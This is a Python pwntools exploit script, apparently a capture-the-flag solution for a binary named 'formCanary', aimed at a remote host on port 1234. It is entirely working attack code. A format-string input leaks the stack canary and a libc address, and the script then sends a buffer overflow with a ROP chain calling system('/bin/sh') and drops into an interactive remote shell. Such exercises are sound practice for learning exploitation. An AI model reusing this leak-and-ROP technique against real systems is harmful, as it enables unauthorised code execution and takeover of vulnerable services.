from pwn import *

# context.log_level = 'DEBUG'

binary = context.binary = ELF('./formCanary')
# p = process(binary.path)
libc = binary.libc
p = remote('35.200.245.250',1234)
p.recvline()
p.sendline(b'%23$p|%27$p')
x = p.recvline().decode().strip().split('|')
# print(x)
canary = int(x[0],16)
log.info('canary: ' + hex(canary))

__libc_start_main_243 = int(x[1],16)
log.info('libc.address: ' + hex(__libc_start_main_243))
libc.address = __libc_start_main_243 - libc.sym.__libc_start_main - 243
log.info('libc.address: ' + hex(libc.address))

pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
payload  = b''
payload += (0x58 - 0x10) * b'A'
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)
p.sendline(payload)
p.interactive()
